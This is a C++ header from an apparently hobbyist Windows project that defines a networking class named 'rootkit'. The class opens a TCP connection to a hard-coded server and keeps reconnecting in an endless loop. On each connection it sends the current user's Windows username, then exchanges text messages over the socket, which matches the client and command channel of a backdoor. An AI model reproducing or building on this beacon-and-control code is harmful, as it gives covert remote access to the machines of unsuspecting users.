#pragma once
#include "common.h"
#include <tchar.h>
constexpr unsigned short UNLEN = 256;

namespace network
{
	//
	constexpr char SERVER_ADDR[] = "127.0.0.1";
	constexpr unsigned int MAX_PACKET_SIZE = 1024;
	int SOCK_TIMEOUT = 1000; //ms

	//because the windows wsa api is such a pain in the ass,
	//the overhead caused from this should be negligable
	class wsa_wrapper
	{
	public:
		wsa_wrapper()
		{
			WSADATA wsaData;
			if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
				throw std::exception("Failed to initialize winsock\n");
		}

		inline void cleanup()
		{
			WSACleanup();
		}

		inline int getError()
		{
			return WSAGetLastError();
		}
	};

	class rootkit
	{
	private:
		wsa_wrapper _wsa;

		SOCKET socket_fd;
		struct sockaddr_in recvAddr;
	public:
		rootkit(unsigned short port): _wsa()
		{
			recvAddr.sin_family = AF_INET;
			recvAddr.sin_port = htons(port);
			inet_pton(AF_INET, (PCSTR)network::SERVER_ADDR, &recvAddr.sin_addr);
		
			//tcp file descriptor used for connecting and I/O operations and such
			if ((socket_fd = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
				throw std::exception("Failed to initialize socket");
		/*
			int time = 50;
			setsockopt(socket_fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&time, sizeof(int));
			setsockopt(socket_fd, SOL_SOCKET, SO_SNDBUF, (const char*)&time, sizeof(int));
			*/
			reconnect();
		}

		bool reconnect()
		{
			std::cout << "reconnect" << std::endl;
			while (true)
			{
				if ((connect(socket_fd, (sockaddr*)&recvAddr, sizeof(recvAddr))) != SOCKET_ERROR)
				{
					wchar_t usrname[UNLEN + 1]; //16 bit UNICODE characters
					DWORD usrnamelen = UNLEN + 1;

					if (GetUserName(usrname, &usrnamelen)) {
						//probably gonna cause some data loss from converting 16 bit char to 8 bit
						send(socket_fd, reinterpret_cast<const char*>(usrname), usrnamelen, 0);
						return true;
					}
				}
			}
		}

		bool send_text(std::string& buffer)
		{
			std::cout << "send" << buffer <<  std::endl;
			//compiler likes to bitch about data loss conversion for some reason so i used a static_cast
			int bytes_received = send(socket_fd, buffer.c_str(), buffer.size(), 0);
			if (bytes_received == SOCKET_ERROR)
			{
				std::cout << "Error: " << _wsa.getError() << std::endl;
				return false;
			}
			

			return true;
		}

		// I/O blocking
		bool recv_text(std::string& buffer)
		{
			// stack should be more efficient when handling small packets such as this
			char tmp[MAX_PACKET_SIZE];
			int res = recv(socket_fd, tmp, MAX_PACKET_SIZE, 0);
			switch (res)
			{
				// -1 general socket error
			case SOCKET_ERROR:
				std::cout << "Error: " << _wsa.getError() << std::endl;
				return false;
				break;

				//connection terminated by remote side
			case 0:
				std::cout << "Error: connection terminated" << std::endl; // std::endl flushes stdout buffer
				return false;
				break;

			default:
				buffer.append(tmp, res);

				return true;
			}
		}

		void echo(std::string buffer)
		{
			if (!(send_text(buffer)))
			{
				reconnect();
				send_text(buffer);
			}
		}

		~rootkit()
		{
			std::cout << "cleanup\n";
			closesocket(socket_fd);
			_wsa.cleanup();
		}
	};
}